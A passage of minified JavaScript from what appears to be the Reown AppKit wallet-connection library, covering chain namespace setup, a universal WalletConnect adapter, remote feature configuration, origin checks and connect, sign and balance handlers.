Set;if(e.methods&&Object.keys(e.methods).forEach(n=>i.add(n)),e.chains&&Object.keys(e.chains).forEach(n=>i.add(n)),e.events&&Object.keys(e.events).forEach(n=>i.add(n)),e.rpcMap&&Object.keys(e.rpcMap).forEach(n=>{const[s]=n.split(":");s&&i.add(s)}),i.forEach(n=>{t[n]||(t[n]=this.createDefaultNamespace(n))}),e.methods&&Object.entries(e.methods).forEach(([n,s])=>{t[n]&&(t[n].methods=s)}),e.chains&&Object.entries(e.chains).forEach(([n,s])=>{t[n]&&(t[n].chains=s)}),e.events&&Object.entries(e.events).forEach(([n,s])=>{t[n]&&(t[n].events=s)}),e.rpcMap){const n=new Set;Object.entries(e.rpcMap).forEach(([s,o])=>{const[a,c]=s.split(":");!a||!c||!t[a]||(t[a].rpcMap||(t[a].rpcMap={}),n.has(a)||(t[a].rpcMap={},n.add(a)),t[a].rpcMap[c]=o)})}return t},createNamespaces(r,e){const t=r.reduce((i,n)=>{const{id:s,chainNamespace:o,rpcUrls:a}=n,c=a.default.http[0];i[o]||(i[o]=this.createDefaultNamespace(o));const l=`${o}:${s}`,u=i[o];switch(u.chains.push(l),l){case qG.caipNetworkId:u.chains.push(qG.deprecatedCaipNetworkId);break;case zG.caipNetworkId:u.chains.push(zG.deprecatedCaipNetworkId);break}return u?.rpcMap&&c&&(u.rpcMap[s]=c),i},{});return this.applyNamespaceOverrides(t,e)},resolveReownName:async r=>{const e=await Z5.resolveName(r);return(Object.values(e?.addresses)||[])[0]?.address||!1},getChainsFromNamespaces(r={}){return Object.values(r).flatMap(e=>{const t=e.chains||[],i=e.accounts.map(n=>{const[s,o]=n.split(":");return`${s}:${o}`});return Array.from(new Set([...t,...i]))})},isSessionEventData(r){return typeof r=="object"&&r!==null&&"id"in r&&"topic"in r&&"params"in r&&typeof r.params=="object"&&r.params!==null&&"chainId"in r.params&&"event"in r.params&&typeof r.params.event=="object"&&r.params.event!==null},isOriginAllowed(r,e,t){for(const i of[...e,...t])if(i.includes("*")){const s=`^${i.replace(/[.*+?^${}()|[\]\\]/gu,"\\$&").replace(/\\\*/gu,".*")}$`;if(new RegExp(s,"u").test(r))return!0}else try{if(new URL(i).origin===r)return!0}catch{if(i===r)return!0}return!1}};class eae{constructor({provider:e,namespace:t}){this.id=Ht.CONNECTOR_ID.WALLET_CONNECT,this.name=ux.ConnectorNamesMap[Ht.CONNECTOR_ID.WALLET_CONNECT],this.type="WALLET_CONNECT",this.imageId=ux.ConnectorImageIds[Ht.CONNECTOR_ID.WALLET_CONNECT],this.getCaipNetworks=de.getCaipNetworks.bind(de),this.caipNetworks=this.getCaipNetworks(),this.provider=e,this.chain=t}get chains(){return this.getCaipNetworks()}async connectWalletConnect(){if(!await this.authenticate()){const t=this.getCaipNetworks(),i=Be.state.universalProviderConfigOverride,n=P9.createNamespaces(t,i);await this.provider.connect({optionalNamespaces:n})}return{clientId:await this.provider.client.core.crypto.getClientId(),session:this.provider.session}}async disconnect(){await this.provider.disconnect()}async authenticate(){const e=this.chains.map(t=>t.caipNetworkId);return z1.universalProviderAuthenticate({universalProvider:this.provider,chains:e,methods:zdt})}}const zdt=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_getCallsStatus","wallet_sendCalls","wallet_getCapabilities","wallet_grantPermissions","wallet_revokePermissions","wallet_getAssets"];class Wdt{constructor(e){this.availableConnectors=[],this.eventListeners=new Map,this.getCaipNetworks=t=>de.getCaipNetworks(t),e&&this.construct(e)}construct(e){this.projectId=e.projectId,this.namespace=e.namespace,this.adapterType=e.adapterType}get connectors(){return this.availableConnectors}get networks(){return this.getCaipNetworks(this.namespace)}setAuthProvider(e){this.addConnector({id:Ht.CONNECTOR_ID.AUTH,type:"AUTH",name:Ht.CONNECTOR_NAMES.AUTH,provider:e,imageId:ux.ConnectorImageIds[Ht.CONNECTOR_ID.AUTH],chain:this.namespace,chains:[]})}addConnector(...e){const t=new Set;this.availableConnectors=[...e,...this.availableConnectors].filter(i=>t.has(i.id)?!1:(t.add(i.id),!0)),this.emit("connectors",this.availableConnectors)}setStatus(e,t){qt.setStatus(e,t)}on(e,t){this.eventListeners.has(e)||this.eventListeners.set(e,new Set),this.eventListeners.get(e)?.add(t)}off(e,t){const i=this.eventListeners.get(e);i&&i.delete(t)}removeAllEventListeners(){this.eventListeners.forEach(e=>{e.clear()})}emit(e,t){const i=this.eventListeners.get(e);i&&i.forEach(n=>n(t))}async connectWalletConnect(e){return{clientId:(await this.getWalletConnectConnector().connectWalletConnect()).clientId}}async switchNetwork(e){const{caipNetwork:t,providerType:i}=e;if(!e.provider)return;const n="provider"in e.provider?e.provider.provider:e.provider;if(i==="WALLET_CONNECT"){n.setDefaultChain(t.caipNetworkId);return}if(n&&i==="AUTH"){const s=n,o=qt.state.preferredAccountTypes?.[t.chainNamespace];await s.switchNetwork(t.caipNetworkId);const a=await s.getUser({chainId:t.caipNetworkId,preferredAccountType:o});this.emit("switchNetwork",a)}}getWalletConnectConnector(){const e=this.connectors.find(t=>t instanceof eae);if(!e)throw new Error("WalletConnectConnector not found");return e}}class Hdt extends Wdt{setUniversalProvider(e){this.addConnector(new eae({provider:e,caipNetworks:this.getCaipNetworks(),namespace:this.namespace}))}async connect(e){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:Number(e.chainId),provider:this.provider,address:""})}async disconnect(){try{await this.getWalletConnectConnector().disconnect()}catch(e){console.warn("UniversalAdapter:disconnect - error",e)}}async getAccounts({namespace:e}){const i=this.provider?.session?.namespaces?.[e]?.accounts?.map(n=>{const[,,s]=n.split(":");return s}).filter((n,s,o)=>o.indexOf(n)===s)||[];return Promise.resolve({accounts:i.map(n=>Ze.createAccount(e,n,e==="bip122"?"payment":"eoa"))})}async syncConnectors(){return Promise.resolve()}async getBalance(e){if(!(e.caipNetwork&&Di.BALANCE_SUPPORTED_CHAINS.includes(e.caipNetwork?.chainNamespace))||e.caipNetwork?.testnet)return{balance:"0.00",symbol:e.caipNetwork?.nativeCurrency.symbol||""};if(qt.state.balanceLoading&&e.chainId===de.state.activeCaipNetwork?.id)return{balance:qt.state.balance||"0.00",symbol:qt.state.balanceSymbol||""};const n=(await qt.fetchTokenBalance()).find(s=>s.chainId===`${e.caipNetwork?.chainNamespace}:${e.chainId}`&&s.symbol===e.caipNetwork?.nativeCurrency.symbol);return{balance:n?.quantity.numeric||"0.00",symbol:n?.symbol||e.caipNetwork?.nativeCurrency.symbol||""}}async signMessage(e){const{provider:t,message:i,address:n}=e;if(!t)throw new Error("UniversalAdapter:signMessage - provider is undefined");let s="";return de.state.activeCaipNetwork?.chainNamespace===Ht.CHAIN.SOLANA?s=(await t.request({method:"solana_signMessage",params:{message:Np.encode(new TextEncoder().encode(i)),pubkey:n}},de.state.activeCaipNetwork?.caipNetworkId)).signature:s=await t.request({method:"personal_sign",params:[i,n]},de.state.activeCaipNetwork?.caipNetworkId),{signature:s}}async estimateGas(){return Promise.resolve({gas:BigInt(0)})}async sendTransaction(){return Promise.resolve({hash:""})}walletGetAssets(e){return Promise.resolve({})}async writeContract(){return Promise.resolve({hash:""})}parseUnits(){return 0n}formatUnits(){return"0"}async getCapabilities(){return Promise.resolve({})}async grantPermissions(){return Promise.resolve({})}async revokePermissions(){return Promise.resolve("0x")}async syncConnection(){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:1,provider:this.provider,address:""})}async switchNetwork(e){const{caipNetwork:t}=e,i=this.getWalletConnectConnector();if(t.chainNamespace===Ht.CHAIN.EVM)try{await i.provider?.request({method:"wallet_switchEthereumChain",params:[{chainId:$i(t.id)}]})}catch(n){if(n.code===p5.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||n.code===p5.ERROR_INVALID_CHAIN_ID||n.code===p5.ERROR_CODE_DEFAULT||n?.data?.originalError?.code===p5.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)try{await i.provider?.request({method:"wallet_addEthereumChain",params:[{chainId:$i(t.id),rpcUrls:[t?.rpcUrls.chainDefault?.http],chainName:t.name,nativeCurrency:t.nativeCurrency,blockExplorerUrls:[t.blockExplorers?.default.url]}]})}catch{throw new Error("Chain is not supported")}}i.provider.setDefaultChain(t.caipNetworkId)}getWalletConnectProvider(){return this.connectors.find(i=>i.type==="WALLET_CONNECT")?.provider}}const Vdt=["email","socials","swaps","onramp","activity","reownBranding"],U8={email:{apiFeatureName:"social_login",localFeatureName:"email",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:r=>{if(!r?.config)return!1;const e=r.config;return!!r.isEnabled&&e.includes("email")},processFallback:r=>r===void 0?Di.DEFAULT_REMOTE_FEATURES.email:!!r},socials:{apiFeatureName:"social_login",localFeatureName:"socials",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:r=>{if(!r?.config)return!1;const e=r.config;return r.isEnabled&&e.length>0?e.filter(t=>t!=="email"):!1},processFallback:r=>r===void 0?Di.DEFAULT_REMOTE_FEATURES.socials:typeof r=="boolean"?r?Di.DEFAULT_REMOTE_FEATURES.socials:!1:r},swaps:{apiFeatureName:"swap",localFeatureName:"swaps",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:r=>{if(!r?.config)return!1;const e=r.config;return r.isEnabled&&e.length>0?e:!1},processFallback:r=>r===void 0?Di.DEFAULT_REMOTE_FEATURES.swaps:typeof r=="boolean"?r?Di.DEFAULT_REMOTE_FEATURES.swaps:!1:r},onramp:{apiFeatureName:"onramp",localFeatureName:"onramp",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:r=>{if(!r?.config)return!1;const e=r.config;return r.isEnabled&&e.length>0?e:!1},processFallback:r=>r===void 0?Di.DEFAULT_REMOTE_FEATURES.onramp:typeof r=="boolean"?r?Di.DEFAULT_REMOTE_FEATURES.onramp:!1:r},activity:{apiFeatureName:"activity",localFeatureName:"history",returnType:!1,isLegacy:!0,isAvailableOnBasic:!1,processApi:r=>!!r.isEnabled,processFallback:r=>r===void 0?Di.DEFAULT_REMOTE_FEATURES.activity:!!r},reownBranding:{apiFeatureName:"reown_branding",localFeatureName:"reownBranding",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:r=>!!r.isEnabled,processFallback:r=>r===void 0?Di.DEFAULT_REMOTE_FEATURES.reownBranding:!!r}},Kdt={localSettingsOverridden:new Set,getApiConfig(r,e){return e?.find(t=>t.id===r)},addWarning(r,e){if(r!==void 0){const t=U8[e],i=t.isLegacy?`"features.${t.localFeatureName}" (now "${e}")`:`"features.${e}"`;this.localSettingsOverridden.add(i)}},processFeature(r,e,t,i,n){const s=U8[r],o=e[s.localFeatureName];if(n&&!s.isAvailableOnBasic)return!1;if(i){const a=this.getApiConfig(s.apiFeatureName,t);return a?.config===null?this.processFallbackFeature(r,o):a?.config?(o!==void 0&&this.addWarning(o,r),this.processApiFeature(r,a)):!1}return this.processFallbackFeature(r,o)},processApiFeature(r,e){return U8[r].processApi(e)},processFallbackFeature(r,e){return U8[r].processFallback(e)},async fetchRemoteFeatures(r){const e=r.basic??!1,t=r.features||{};this.localSettingsOverridden.clear();let i=null,n=!1;try{i=await rt.fetchProjectConfig(),n=i!=null}catch(o){console.warn("[Reown Config] Failed to fetch remote project configuration. Using local/default values.",o)}const s=n&&!e?Di.DEFAULT_REMOTE_FEATURES:Di.DEFAULT_REMOTE_FEATURES_DISABLED;try{for(const o of Vdt){const a=this.processFeature(o,t,i,n,e);Object.assign(s,{[o]:a})}}catch(o){return console.warn("[Reown Config] Failed to process the configuration from Cloud. Using default values.",o),Di.DEFAULT_REMOTE_FEATURES}if(n&&this.localSettingsOverridden.size>0){const o=`Your local configuration for ${Array.from(this.localSettingsOverridden).join(", ")} was ignored because a remote configuration was successfully fetched. Please manage these features via your project dashboard on dashboard.reown.com.`;ou.open({shortMessage:"Local configuration ignored",longMessage:`[Reown Config Notice] ${o}`},"warning")}return s}};class Gdt{constructor(e){this.chainNamespaces=[],this.remoteFeatures={},this.reportedAlertErrors={},this.getCaipNetwork=(t,i)=>{if(t){const n=de.getNetworkData(t)?.requestedCaipNetworks?.find(a=>a.id===i);if(n)return n;const s=de.getNetworkData(t)?.caipNetwork;return s||de.getRequestedCaipNetworks(t).filter(a=>a.chainNamespace===t)?.[0]}return de.state.activeCaipNetwork||this.defaultCaipNetwork},this.getCaipNetworkId=()=>{const t=this.getCaipNetwork();if(t)return t.id},this.getCaipNetworks=t=>de.getCaipNetworks(t),this.getActiveChainNamespace=()=>de.state.activeChain,this.setRequestedCaipNetworks=(t,i)=>{de.setRequestedCaipNetworks(t,i)},this.getApprovedCaipNetworkIds=()=>de.getAllApprovedCaipNetworkIds(),this.getCaipAddress=t=>de.state.activeChain===t||!t?de.state.activeCaipAddress:de.getAccountProp("caipAddress",t),this.setClientId=t=>{nr.setClientId(t)},this.getProvider=t=>An.getProvider(t),this.getProviderType=t=>An.getProviderId(t),this.getPreferredAccountType=t=>qt.state.preferredAccountTypes?.[t],this.setCaipAddress=(t,i)=>{qt.setCaipAddress(t,i),t&&Be.state.enableEmbedded&&this.close()},this.setBalance=(t,i,n)=>{qt.setBalance(t,i,n)},this.setProfileName=(t,i)=>{qt.setProfileName(t,i)},this.setProfileImage=(t,i)=>{qt.setProfileImage(t,i)},this.setUser=(t,i)=>{qt.setUser(t,i)},this.resetAccount=t=>{qt.resetAccount(t)},this.setCaipNetwork=t=>{de.setActiveCaipNetwork(t)},this.setCaipNetworkOfNamespace=(t,i)=>{de.setChainNetworkData(i,{caipNetwork:t})},this.setAllAccounts=(t,i)=>{qt.setAllAccounts(t,i),Be.setHasMultipleAddresses(t?.length>1)},this.setStatus=(t,i)=>{qt.setStatus(t,i),We.isConnected()?Bt.setConnectionStatus("connected"):Bt.setConnectionStatus("disconnected")},this.getAddressByChainNamespace=t=>de.getAccountProp("address",t),this.setConnectors=t=>{const i=[...We.state.allConnectors,...t];We.setConnectors(i)},this.setConnections=(t,i)=>{ut.setConnections(t,i)},this.fetchIdentity=t=>nr.fetchIdentity(t),this.getReownName=t=>Z5.getNamesForAddress(t),this.getConnectors=()=>We.getConnectors(),this.getConnectorImage=t=>Es.getConnectorImage(t),this.setConnectedWalletInfo=(t,i)=>{const n=An.getProviderId(i),s=t?{...t,type:n}:void 0;qt.setConnectedWalletInfo(s,i)},this.getIsConnectedState=()=>!!de.state.activeCaipAddress,this.addAddressLabel=(t,i,n)=>{qt.addAddressLabel(t,i,n)},this.removeAddressLabel=(t,i)=>{qt.removeAddressLabel(t,i)},this.getAddress=t=>de.state.activeChain===t||!t?qt.state.address:de.getAccountProp("address",t),this.setApprovedCaipNetworksData=t=>de.setApprovedCaipNetworksData(t),this.resetNetwork=t=>{de.resetNetwork(t)},this.addConnector=t=>{We.addConnector(t)},this.resetWcConnection=()=>{ut.resetWcConnection()},this.setAddressExplorerUrl=(t,i)=>{qt.setAddressExplorerUrl(t,i)},this.setSmartAccountDeployed=(t,i)=>{qt.setSmartAccountDeployed(t,i)},this.setSmartAccountEnabledNetworks=(t,i)=>{de.setSmartAccountEnabledNetworks(t,i)},this.setPreferredAccountType=(t,i)=>{qt.setPreferredAccountType(t,i)},this.setEIP6963Enabled=t=>{Be.setEIP6963Enabled(t)},this.handleUnsafeRPCRequest=()=>{if(this.isOpen()){if(this.isTransactionStackEmpty())return;this.redirect("ApproveTransaction")}else this.open({view:"ApproveTransaction"})},this.options=e,this.version=e.sdkVersion,this.caipNetworks=this.extendCaipNetworks(e),this.chainNamespaces=this.getChainNamespacesSet(e.adapters,this.caipNetworks),this.defaultCaipNetwork=this.extendDefaultCaipNetwork(e),this.chainAdapters=this.createAdapters(e.adapters),this.readyPromise=this.initialize(e)}getChainNamespacesSet(e,t){const i=e?.map(s=>s.namespace).filter(s=>!!s);if(i?.length)return[...new Set(i)];const n=t?.map(s=>s.chainNamespace);return[...new Set(n)]}async initialize(e){this.initializeProjectSettings(e),this.initControllers(e),await this.initChainAdapters(),this.sendInitializeEvent(e),await this.syncExistingConnection(),this.remoteFeatures=await Kdt.fetchRemoteFeatures(e),Be.setRemoteFeatures(this.remoteFeatures),this.remoteFeatures.onramp&&mP.setOnrampProviders(this.remoteFeatures.onramp),(Be.state.remoteFeatures?.email||Array.isArray(Be.state.remoteFeatures?.socials)&&Be.state.remoteFeatures?.socials.length>0)&&await this.checkAllowedOrigins()}async checkAllowedOrigins(){const e=await rt.fetchAllowedOrigins();if(e&&Ze.isClient()){const t=window.location.origin;P9.isOriginAllowed(t,e,p5.DEFAULT_ALLOWED_ANCESTORS)||ou.open(Sm.ALERT_ERRORS.INVALID_APP_CONFIGURATION,"error")}else ou.open(Sm.ALERT_ERRORS.PROJECT_ID_NOT_CONFIGURED,"error")}sendInitializeEvent(e){const{...t}=e;delete t.adapters,delete t.universalProvider,Hr.sendEvent({type:"track",event:"INITIALIZE",properties:{...t,networks:e.networks.map(i=>i.id),siweConfig:{options:e.siweConfig?.options||{}}}})}initControllers(e){this.initializeOptionsController(e),this.initializeChainController(e),this.initializeThemeController(e),this.initializeConnectionController(e),this.initializeConnectorController()}initializeThemeController(e){e.themeMode&&ao.setThemeMode(e.themeMode),e.themeVariables&&ao.setThemeVariables(e.themeVariables)}initializeChainController(e){if(!this.connectionControllerClient||!this.networkControllerClient)throw new Error("ConnectionControllerClient and NetworkControllerClient must be set");de.initialize(e.adapters??[],this.caipNetworks,{connectionControllerClient:this.connectionControllerClient,networkControllerClient:this.networkControllerClient});const t=this.getDefaultNetwork();t&&de.setActiveCaipNetwork(t)}initializeConnectionController(e){ut.setWcBasic(e.basic??!1)}initializeConnectorController(){We.initialize(this.chainNamespaces)}initializeProjectSettings(e){Be.setProjectId(e.projectId),Be.setSdkVersion(e.sdkVersion)}initializeOptionsController(e){Be.setDebug(e.debug!==!1),Be.setEnableWalletConnect(e.enableWalletConnect!==!1),Be.setEnableWalletGuide(e.enableWalletGuide!==!1),Be.setEnableWallets(e.enableWallets!==!1),Be.setEIP6963Enabled(e.enableEIP6963!==!1),Be.setEnableNetworkSwitch(e.enableNetworkSwitch!==!1),Be.setEnableAuthLogger(e.enableAuthLogger!==!1),Be.setCustomRpcUrls(e.customRpcUrls),Be.setEnableEmbedded(e.enableEmbedded),Be.setAllWallets(e.allWallets),Be.setIncludeWalletIds(e.includeWalletIds),Be.setExcludeWalletIds(e.excludeWalletIds),Be.setFeaturedWalletIds(e.featuredWalletIds),Be.setTokens(e.tokens),Be.setTermsConditionsUrl(e.termsConditionsUrl),Be.setPrivacyPolicyUrl(e.privacyPolicyUrl),Be.setCustomWallets(e.customWallets),Be.setFeatures(e.features),Be.setAllowUnsupportedChain(e.allowUnsupportedChain),Be.setUniversalProviderConfigOverride(e.universalProviderConfigOverride),Be.setPreferUniversalLinks(e.experimental_preferUniversalLinks),Be.setDefaultAccountTypes(e.defaultAccountTypes);const t=Bt.getPreferredAccountTypes()||{},i={...Be.state.defaultAccountTypes,...t};qt.setPreferredAccountTypes(i);const n=this.getDefaultMetaData();if(!e.metadata&&n&&(e.metadata=n),Be.setMetadata(e.metadata),Be.setDisableAppend(e.disableAppend),Be.setEnableEmbedded(e.enableEmbedded),Be.setSIWX(e.siwx),!e.projectId){ou.open(Sm.ALERT_ERRORS.PROJECT_ID_NOT_CONFIGURED,"error");return}if(e.adapters?.find(o=>o.namespace===Ht.CHAIN.EVM)&&e.siweConfig){if(e.siwx)throw new Error("Cannot set both `siweConfig` and `siwx` options");Be.setSIWX(e.siweConfig.mapToSIWX())}}getDefaultMetaData(){return Ze.isClient()?{name:document.getElementsByTagName("title")?.[0]?.textContent||"",description:document.querySelector('meta[property="og:description"]')?.content||"",url:window.location.origin,icons:[document.querySelector('link[rel~="icon"]')?.href||""]}:null}setUnsupportedNetwork(e){const t=this.getActiveChainNamespace();if(t){const i=qm.getUnsupportedNetwork(`${t}:${e}`);de.setActiveCaipNetwork(i)}}getDefaultNetwork(){return qm.getCaipNetworkFromStorage(this.defaultCaipNetwork)}extendCaipNetwork(e,t){return qm.extendCaipNetwork(e,{customNetworkImageUrls:t.chainImages,projectId:t.projectId})}extendCaipNetworks(e){return qm.extendCaipNetworks(e.networks,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId})}extendDefaultCaipNetwork(e){const t=e.networks.find(n=>n.id===e.defaultNetwork?.id);return t?qm.extendCaipNetwork(t,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId}):void 0}async disconnectNamespace(e){try{const t=this.getAdapter(e),i=An.getProvider(e),n=An.getProviderId(e),{caipAddress:s}=de.getAccountData(e)||{};this.setLoading(!0,e),s&&t?.disconnect&&await t.disconnect({provider:i,providerType:n}),Bt.removeConnectedNamespace(e),An.resetChain(e),this.setUser(void 0,e),this.setStatus("disconnected",e),this.setConnectedWalletInfo(void 0,e),We.removeConnectorId(e),de.resetAccount(e),de.resetNetwork(e),this.setLoading(!1,e)}catch(t){throw this.setLoading(!1,e),new Error(`Failed to disconnect chain ${e}: ${t.message}`)}}createClients(){this.connectionControllerClient={connectWalletConnect:async()=>{const e=de.state.activeChain,t=this.getAdapter(e),i=this.getCaipNetwork(e)?.id;if(!t)throw new Error("Adapter not found");const n=await t.connectWalletConnect(i);this.close(),this.setClientId(n?.clientId||null),Bt.setConnectedNamespaces([...de.state.chains.keys()]),this.chainNamespaces.forEach(s=>{We.setConnectorId(bf.CONNECTOR_TYPE_WALLET_CONNECT,s)}),await this.syncWalletConnectAccount()},connectExternal:async({id:e,info:t,type:i,provider:n,chain:s,caipNetwork:o,socialUri:a})=>{const c=de.state.activeChain,l=s||c,u=this.getAdapter(l);if(s&&s!==c&&!o){const g=this.getCaipNetworks().find(w=>w.chainNamespace===s);g&&this.setCaipNetwork(g)}if(!u)throw new Error("Adapter not found");const d=this.getCaipNetwork(l),h=await u.connect({id:e,info:t,type:i,provider:n,socialUri:a,chainId:o?.id||d?.id,rpcUrl:o?.rpcUrls?.default?.http?.[0]||d?.rpcUrls?.default?.http?.[0]});if(!h)return;Bt.addConnectedNamespace(l),this.syncProvider({...h,chainNamespace:l});const f=qt.state.allAccounts,{accounts:p}=f?.length>0?{accounts:[...f]}:await u.getAccounts({namespace:l,id:e});this.setAllAccounts(p,l),this.setStatus("connected",l),this.syncConnectedWalletInfo(l)},reconnectExternal:async({id:e,info:t,type:i,provider:n})=>{const s=de.state.activeChain,o=this.getAdapter(s);o?.reconnect&&(await o?.reconnect({id:e,info:t,type:i,provider:n,chainId:this.getCaipNetwork()?.id}),Bt.addConnectedNamespace(s),this.syncConnectedWalletInfo(s))},disconnect:async e=>{const t=Odt(e);try{const i=await Promise.allSettled(t.map(async([s])=>this.disconnectNamespace(s)));Si.resetSend(),ut.resetWcConnection(),await z1.clearSessions(),We.setFilterByNamespace(void 0);const n=i.filter(s=>s.status==="rejected");if(n.length>0)throw new Error(n.map(s=>s.reason.message).join(", "));Bt.deleteConnectedSocialProvider(),Hr.sendEvent({type:"track",event:"DISCONNECT_SUCCESS",properties:{namespace:e||"all"}})}catch(i){throw new Error(`Failed to disconnect chains: ${i.message}`)}},checkInstalled:e=>e?e.some(t=>!!window.ethereum?.[String(t)]):!!window.ethereum,signMessage:async e=>(await this.getAdapter(de.state.activeChain)?.signMessage({message:e,address:qt.state.address,provider:An.getProvider(de.state.activeChain)}))?.signature||"",sendTransaction:async e=>{const t=e.chainNamespace;if(Di.SEND_SUPPORTED_NAMESPACES.includes(t)){const i=this.getAdapter(de.state.activeChain),n=An.getProvider(t);return(await i?.sendTransaction({...e,caipNetwork:this.getCaipNetwork(),provider:n}))?.hash||""}return""},estimateGas:async e=>{if(e.chainNamespace===Ht.CHAIN.EVM){const t=this.getAdapter(de.state.activeChain),i=An.getProvider(de.state.activeChain),n=this.getCaipNetwork();if(!n)throw new Error("CaipNetwork is undefined");return(await t?.estimateGas({...e,provider:i,caipNetwork:n}))?.gas||0n}return 0n},getEnsAvatar:async()=>(await this.syncIdentity({address:qt.state.address,chainId:Number(this.getCaipNetwork()?.id),chainNamespace:de.state.activeChain}),qt.state.profileImage||!1),getEnsAddress:async e=>await P9.resolveReownName(e),writeContract:async e=>{const t=this.getAdapter(de.state.activeChain),i=this.getCaipNetwork(),n=this.getCaipAddress(),s=An.getProvider(de.state.activeChain);if(!i||!n)throw new Error("CaipNetwork or CaipAddress is undefined");return(await t?.writeContract({...e,caipNetwork:i,provider:s,caipAddress:n}))?.hash},parseUnits:(e,t)=>this.getAdapter(de.state.activeChain)?.parseUnits({value:e,decimals:t})??0n,formatUnits:(e,t)=>this.getAdapter(de.state.activeChain)?.formatUnits({value:e,decimals:t})??"0",getCapabilities:async e=>await this.getAdapter(de.state.activeChain)?.getCapabilities(e),grantPermissions:async e=>await this.getAdapter(de.state.activeChain)?.grantPermissions(e),revokePermissions:async e=>{const t=this.getAdapter(de.state.activeChain);return t?.revokePermissions?await t.revokePermissions(e):"0x"},walletGetAssets:async e=>await this.getAdapter(de.state.activeChain)?.walletGetAssets(e)??{},updateBalance:e=>{const t=this.getCaipNetwork(e);!t||!qt.state.address||this.updateNativeBalance(qt.state.address,t?.id,e)}},this.networkControllerClient={switchCaipNetwork:async e=>await this.switchCaipNetwork(e),getApprovedCaipNetworksData:async()=>this.getApprovedCaipNetworksData()},ut.setClient(this.connectionControllerClient)}getApprovedCaipNetworksData(){if(An.getProviderId(de.state.activeChain)===bf.CONNECTOR_TYPE_WALLET_CONNECT){const t=this.universalProvider?.session?.namespaces;return{supportsAllNetworks:this.universalProvider?.session?.peer?.metadata.name==="MetaMask Wallet",approvedCaipNetworkIds:this.getChainsFromNamespaces(t)}}return{supportsAllNetworks:!0,approvedCaipNetworkIds:[]}}async switchCaipNetwork(e){if(!e)return;const t=e.chainNamespace;if(this.getAddressByChainNamespace(e.chainNamespace)){const n=An.getProvider(t),s=An.getProviderId(t);if(e.chainNamespace===de.state.activeChain)await this.getAdapter(t)?.switchNetwork({caipNetwork:e,provider:n,providerType:s});else if(this.setCaipNetwork(e),s===bf.CONNECTOR_TYPE_WALLET_CONNECT)this.syncWalletConnectAccount();else{const o=this.getAddressByChainNamespace(t);o&&this.syncAccount({address:o,chainId:e.id,chainNamespace:t})}}else this.setCaipNetwork(e)}getChainsFromNamespaces(e={}){return Object.values(e).flatMap(t=>{const i=t.chains||[],n=t.accounts.map(s=>{const{chainId:o,chainNamespace:a}=uf.parseCaipAddress(s);return`${a}:${o}`});return Array.from(new Set([...i,...n]))})}createAdapters(e){return this.createClients(),this.chainNamespaces.reduce((t,i)=>{const n=e?.find(s=>s.namespace===i);return n?(n.construct({namespace:i,projectId:this.options?.projectId,networks:this.getCaipNetworks()}),t[i]=n):t[i]=new Hdt({namespace:i,networks:this.getCaipNetworks()}),t},{})}async initChainAdapter(e){this.onConnectors(e),this.listenAdapter(e),await this.chainAdapters?.[e].syncConnectors(this.options,this),await this.createUniversalProviderForAdapter(e)}async initChainAdapters(){await Promise.all(this.chainNamespaces.map(async e=>{await this.initChainAdapter(e)}))}onConnectors(e){this.getAdapter(e)?.on("connectors",this.setConnectors.bind(this))}listenAdapter(e){const t=this.getAdapter(e);if(!t)return;const i=Bt.getConnectionStatus();i==="connected"?this.setStatus("connecting",e):i==="disconnected"?(Bt.clearAddressCache(),this.setStatus(i,e)):this.setStatus(i,e),t.on("switchNetwork",({address:n,chainId:s})=>{const o=this.getCaipNetworks().find(l=>l.id===s||l.caipNetworkId===s),a=de.state.activeChain===e,c=de.getAccountProp("address",e);if(o){const l=a&&n?n:c;l&&this.syncAccount({address:l,chainId:o.id,chainNamespace:e})}else this.setUnsupportedNetwork(s)}),t.on("disconnect",this.disconnect.bind(this,e)),t.on("connections",n=>{this.setConnections(n,e)}),t.on("pendingTransactions",()=>{const n=qt.state.address,s=de.state.activeCaipNetwork;!n||!s?.id||this.updateNativeBalance(n,s.id,s.chainNamespace)}),t.on("accountChanged",({address:n,chainId:s})=>{const o=de.state.activeChain===e;o&&s?this.syncAccount({address:n,chainId:s,chainNamespace:e}):o&&de.state.activeCaipNetwork?.id?this.syncAccount({address:n,chainId:de.state.activeCaipNetwork?.id,chainNamespace:e}):this.syncAccountInfo(n,s,e),this.syncAllAccounts(e)})}async createUniversalProviderForAdapter(e){await this.getUniversalProvider(),this.universalProvider&&this.chainAdapters?.[e]?.setUniversalProvider?.(this.universalProvider)}async syncExistingConnection(){await Promise.allSettled(this.chainNamespaces.map(e=>this.syncNamespaceConnection(e)))}async syncNamespaceConnection(e){try{e===Ht.CHAIN.EVM&&Ze.isSafeApp()&&We.setConnectorId(Ht.CONNECTOR_ID.SAFE,e);const t=We.getConnectorId(e);switch(this.setStatus("connecting",e),t){case Ht.CONNECTOR_ID.WALLET_CONNECT:await this.syncWalletConnectAccount();break;case Ht.CONNECTOR_ID.AUTH:break;default:await this.syncAdapterConnection(e)}}catch(t){console.warn("AppKit couldn't sync existing connection",t),this.setStatus("disconnected",e)}}async syncAdapterConnection(e){const t=this.getAdapter(e),i=We.getConnectorId(e),n=this.getCaipNetwork(e),o=We.getConnectors(e).find(a=>a.id===i);try{if(!t||!o)throw new Error(`Adapter or connector not found for namespace ${e}`);if(!n?.id)throw new Error("CaipNetwork not found");const a=await t?.syncConnection({namespace:e,id:o.id,chainId:n.id,rpcUrl:n?.rpcUrls?.default?.http?.[0]});if(a){const c=await 